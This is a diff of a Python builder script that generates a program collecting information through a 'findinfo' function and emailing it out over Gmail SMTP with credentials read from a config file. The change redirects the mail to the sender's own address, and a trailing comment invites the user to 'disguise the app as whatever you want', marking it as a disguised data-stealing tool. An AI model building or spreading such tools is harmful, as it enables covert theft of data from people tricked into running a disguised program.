@@ -5,17 +5,15 @@ from email.mime.multipart import MIMEMultipart
 
 # Before you start, go to https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4O13KGBUwF9HwEI0q6D634Jj7VWs9WEG4fnoJhshHctblM9kwofamyR0lqEjekUtfJ9PWn8O73_1ywEhFwVaYVhsV-_Pg\nand enable less secure apps. When finished, click enter in the console.
 
-sender_email = ''
-sender_password = ''
-recv_email = ''
+your_email = ''
+your_password = ''
 message = ''
 subject = ''
 
 with open('config.json') as f:
     data = json.load(f)
-    sender_email = data['sender_email']
-    sender_password = data['sender_password']
-    recv_email = data['recv_email']
+    your_email = data['your_email']
+    your_password = data['your_password']
     subject = data['subject']
 
 with open('generated.py', 'w') as f:
@@ -59,16 +57,15 @@ def findinfo(data):
     return msg
 
 
-sender_email = '{sender_email}'
-sender_password = '{sender_password}'
-recv_email = '{recv_email}'
+sender_email = '{your_email}'
+sender_password = '{your_password}'
 subject = '{subject}'
 message = findinfo({data})
 
 msg = MIMEMultipart()
 msg['Subject'] = subject
 msg['From'] = sender_email
-msg['To'] = recv_email
+msg['To'] = sender_email
 msg.attach(MIMEText(message))
 
 
@@ -78,7 +75,7 @@ context = ssl.create_default_context()
 
 with smtplib.SMTP_SSL('smtp.gmail.com', port, context=context) as server:
     server.login(sender_email, sender_password)
-    server.sendmail(sender_email, recv_email, msg.as_string())
+    server.sendmail(sender_email, sender_email, msg.as_string())
 
 # Disguise the app as whatever you want down below |
 #                                                 \ /
